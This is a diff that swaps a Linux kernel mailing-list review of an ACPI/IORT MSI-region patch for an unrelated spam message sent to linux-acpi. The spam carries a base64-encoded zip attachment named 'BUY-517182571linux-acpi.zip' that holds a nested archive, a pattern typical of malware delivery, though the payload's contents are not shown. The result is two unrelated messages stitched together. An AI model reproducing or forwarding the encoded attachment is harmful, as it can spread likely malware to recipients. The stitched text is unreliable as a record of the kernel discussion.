@@ -1,223 +1,146 @@
-From: Shameerali Kolothum Thodi <shameerali.kolothum.thodi-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>
-Subject: RE: [PATCH v8 2/5] ACPI/IORT: Add msi address regions reservation
-	helper
-Date: Fri, 6 Oct 2017 10:17:17 +0000
-Message-ID: <5FC3163CFD30C246ABAA99954A238FA83841DB56@FRAEML521-MBX.china.huawei.com>
-References: <20170927133241.21036-1-shameerali.kolothum.thodi@huawei.com>
-	<20170927133241.21036-3-shameerali.kolothum.thodi@huawei.com>
-	<001729e8-7b34-0bb4-8af6-8af100661906@arm.com>
+From: <info@kunstreich-im-pott.de>
+Subject: (unknown)
+Date: Fri, 06 Oct 2017 11:55:09 -0000
+Message-ID: <150729090974.32758.8787534668382028435@airmail.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Return-path: <iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <001729e8-7b34-0bb4-8af6-8af100661906-5wv7dgnIgG8@public.gmane.org>
-Content-Language: en-US
-List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.linuxfoundation.org/pipermail/iommu/>
-List-Post: <mailto:iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-List-Help: <mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/iommu>,
-	<mailto:iommu-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
-Sender: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Errors-To: iommu-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Marc Zyngier <marc.zyngier-5wv7dgnIgG8@public.gmane.org>, "lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org" <lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org>, "sudeep.holla-5wv7dgnIgG8@public.gmane.org" <sudeep.holla-5wv7dgnIgG8@public.gmane.org>, "will.deacon-5wv7dgnIgG8@public.gmane.org" <will.deacon-5wv7dgnIgG8@public.gmane.org>, "robin.murphy-5wv7dgnIgG8@public.gmane.org" <robin.murphy-5wv7dgnIgG8@public.gmane.org>, "joro-zLv9SwRftAIdnm+yROfE0A@public.gmane.org" <joro-zLv9SwRftAIdnm+yROfE0A@public.gmane.org>, "mark.rutland-5wv7dgnIgG8@public.gmane.org" <mark.rutland-5wv7dgnIgG8@public.gmane.org>, "robh-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org" <robh-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Cc: "devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Gabriele Paoloni <gabriele.paoloni-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>, Linuxarm <linuxarm-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>, "linux-acpi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-acpi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, "iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org" <iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, "Guohanjun (Hanjun Guo)" <guohanjun-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>, "linux-arm-kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org" <linux-arm-kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>, "devel-E0kO6a4B6psdnm+yROfE0A@public.gmane.org" <devel-E0kO6a4B6psdnm+yROfE0A@public.gmane.org>
+Content-Type: application/zip; name="BUY-517182571linux-acpi.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from e8.a9.ce6d.cidr.airmail.net ([206.109.169.232]:49272 "HELO
+        airmail.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751869AbdJFLzM (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Fri, 6 Oct 2017 07:55:12 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-
-
-> -----Original Message-----
-> From: Marc Zyngier [mailto:marc.zyngier-5wv7dgnIgG8@public.gmane.org]
-> Sent: Wednesday, October 04, 2017 3:18 PM
-> To: Shameerali Kolothum Thodi <shameerali.kolothum.thodi-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>;
-> lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org; sudeep.holla-5wv7dgnIgG8@public.gmane.org; will.deacon-5wv7dgnIgG8@public.gmane.org;
-> robin.murphy-5wv7dgnIgG8@public.gmane.org; joro-zLv9SwRftAIdnm+yROfE0A@public.gmane.org; mark.rutland-5wv7dgnIgG8@public.gmane.org;
-> robh-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org
-> Cc: Gabriele Paoloni <gabriele.paoloni-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>; John Garry
-> <john.garry-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>; iommu-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org; linux-arm-
-> kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org; linux-acpi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org;
-> devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org; devel-E0kO6a4B6psdnm+yROfE0A@public.gmane.org; Linuxarm
-> <linuxarm-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>; Wangzhou (B) <wangzhou1-C8/M+/jPZTeaMJb+Lgu22Q@public.gmane.org>;
-> Guohanjun (Hanjun Guo) <guohanjun-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>
-> Subject: Re: [PATCH v8 2/5] ACPI/IORT: Add msi address regions reservation
-> helper
-> 
-> On 27/09/17 14:32, Shameer Kolothum wrote:
-> > On some platforms msi parent address regions have to be excluded from
-> > normal IOVA allocation in that they are detected and decoded in a HW
-> > specific way by system components and so they cannot be considered
-> > normal IOVA address space.
-> >
-> > Add a helper function that retrieves ITS address regions - the msi
-> > parent - through IORT device <-> ITS mappings and reserves it so that
-> > these regions will not be translated by IOMMU and will be excluded
-> > from IOVA allocations.
-> >
-> > Signed-off-by: Shameer Kolothum
-> <shameerali.kolothum.thodi-hv44wF8Li93QT0dZR+AlfA@public.gmane.org>
-> > [lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org: updated commit log/added comments]
-> > Signed-off-by: Lorenzo Pieralisi <lorenzo.pieralisi-5wv7dgnIgG8@public.gmane.org>
-> > ---
-> >  drivers/acpi/arm64/iort.c        | 96
-> ++++++++++++++++++++++++++++++++++++++--
-> >  drivers/irqchip/irq-gic-v3-its.c |  3 +-
-> >  include/linux/acpi_iort.h        |  7 ++-
-> >  3 files changed, 101 insertions(+), 5 deletions(-)
-> >
-> > diff --git a/drivers/acpi/arm64/iort.c b/drivers/acpi/arm64/iort.c
-> > index 9565d57..14efa9d 100644
-> > --- a/drivers/acpi/arm64/iort.c
-> > +++ b/drivers/acpi/arm64/iort.c
-> > @@ -39,6 +39,7 @@
-> >  struct iort_its_msi_chip {
-> >  	struct list_head	list;
-> >  	struct fwnode_handle	*fw_node;
-> > +	phys_addr_t		base_addr;
-> >  	u32			translation_id;
-> >  };
-> >
-> > @@ -136,14 +137,16 @@ typedef acpi_status (*iort_find_node_callback)
-> > static DEFINE_SPINLOCK(iort_msi_chip_lock);
-> >
-> >  /**
-> > - * iort_register_domain_token() - register domain token and related
-> > ITS ID
-> > - * to the list from where we can get it back later on.
-> > + * iort_register_domain_token() - register domain token along with
-> > + related
-> > + * ITS ID and base address to the list from where we can get it back later
-> on.
-> >   * @trans_id: ITS ID.
-> > + * @base: ITS base address.
-> >   * @fw_node: Domain token.
-> >   *
-> >   * Returns: 0 on success, -ENOMEM if no memory when allocating list
-> element
-> >   */
-> > -int iort_register_domain_token(int trans_id, struct fwnode_handle
-> > *fw_node)
-> > +int iort_register_domain_token(int trans_id, phys_addr_t base,
-> > +			       struct fwnode_handle *fw_node)
-> >  {
-> >  	struct iort_its_msi_chip *its_msi_chip;
-> >
-> > @@ -153,6 +156,7 @@ int iort_register_domain_token(int trans_id,
-> > struct fwnode_handle *fw_node)
-> >
-> >  	its_msi_chip->fw_node = fw_node;
-> >  	its_msi_chip->translation_id = trans_id;
-> > +	its_msi_chip->base_addr = base;
-> >
-> >  	spin_lock(&iort_msi_chip_lock);
-> >  	list_add(&its_msi_chip->list, &iort_msi_chip_list); @@ -481,6
-> > +485,24 @@ int iort_pmsi_get_dev_id(struct device *dev, u32 *dev_id)
-> >  	return -ENODEV;
-> >  }
-> >
-> > +static int __maybe_unused iort_find_its_base(u32 its_id, phys_addr_t
-> > +*base) {
-> > +	struct iort_its_msi_chip *its_msi_chip;
-> > +	bool match = false;
-> > +
-> > +	spin_lock(&iort_msi_chip_lock);
-> > +	list_for_each_entry(its_msi_chip, &iort_msi_chip_list, list) {
-> > +		if (its_msi_chip->translation_id == its_id) {
-> > +			*base = its_msi_chip->base_addr;
-> > +			match = true;
-> > +			break;
-> > +		}
-> > +	}
-> > +	spin_unlock(&iort_msi_chip_lock);
-> > +
-> > +	return match ? 0 : -ENODEV;
-> > +}
-> > +
-> >  /**
-> >   * iort_dev_find_its_id() - Find the ITS identifier for a device
-> >   * @dev: The device.
-> > @@ -639,6 +661,72 @@ int iort_add_device_replay(const struct
-> iommu_ops
-> > *ops, struct device *dev)
-> >
-> >  	return err;
-> >  }
-> > +
-> > +/**
-> > + * iort_iommu_msi_get_resv_regions - Reserved region driver helper
-> > + * @dev: Device from iommu_get_resv_regions()
-> > + * @head: Reserved region list from iommu_get_resv_regions()
-> > + *
-> > + * Returns: Number of reserved regions on success (0 if no associated msi
-> > + *          regions), appropriate error value otherwise. The ITS regions
-> > + *          associated with the device are the msi reserved regions.
-> > + */
-> > +int iort_iommu_msi_get_resv_regions(struct device *dev, struct
-> > +list_head *head) {
-> > +	struct acpi_iort_its_group *its;
-> > +	struct acpi_iort_node *node, *its_node = NULL;
-> > +	int i, resv = 0;
-> > +
-> > +	node = iort_find_dev_node(dev);
-> > +	if (!node)
-> > +		return -ENODEV;
-> > +
-> > +	/*
-> > +	 * Current logic to reserve ITS regions relies on HW topologies
-> > +	 * where a given PCI or named component maps its IDs to only one
-> > +	 * ITS group; if a PCI or named component can map its IDs to
-> > +	 * different ITS groups through IORT mappings this function has
-> > +	 * to be reworked to ensure we reserve regions for all ITS groups
-> > +	 * a given PCI or named component may map IDs to.
-> > +	 */
-> > +	if (dev_is_pci(dev)) {
-> > +		u32 rid;
-> > +
-> > +		pci_for_each_dma_alias(to_pci_dev(dev), __get_pci_rid,
-> &rid);
-> > +		its_node = iort_node_map_id(node, rid, NULL,
-> IORT_MSI_TYPE);
-> > +	} else {
-> > +		for (i = 0; i < node->mapping_count; i++) {
-> > +			its_node = iort_node_map_platform_id(node, NULL,
-> > +							 IORT_MSI_TYPE, i);
-> > +			if (its_node)
-> > +				break;
-> > +		}
-> > +	}
-> > +
-> > +	if (!its_node)
-> > +		return 0;
-> > +
-> > +	/* Move to ITS specific data */
-> > +	its = (struct acpi_iort_its_group *)its_node->node_data;
-> > +
-> > +	for (i = 0; i < its->its_count; i++) {
-> > +		phys_addr_t base;
-> > +
-> > +		if (!iort_find_its_base(its->identifiers[i], &base)) {
-> > +			int prot = IOMMU_WRITE | IOMMU_NOEXEC |
-> IOMMU_MMIO;
-> > +			struct iommu_resv_region *region;
-> > +
-> > +			region = iommu_alloc_resv_region(base, SZ_128K,
-> prot,
-> > +							 IOMMU_RESV_MSI);
-> 
-> Same as the OF part: I strongly object to reserving the whole 128kB range.
-> What we really care about is the second 64kB page, and that is what should
-> get reserved.
-
-Thanks Marc. I will make the changes in next revision.
-
-Also as we are still discussing about the DT approach for this, I am thinking
-of sending out the v9 with the above fix and blacklisting the HiSilicon PCIe
-controllers on DT based hip06/hip07 systems when SMMUv3 is enabled.
-
-Hi Will,
-
-Hope that will address your concerns with respect to only having ACPI quirk
-for this. 
-
-Thanks,
-Shameer
+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
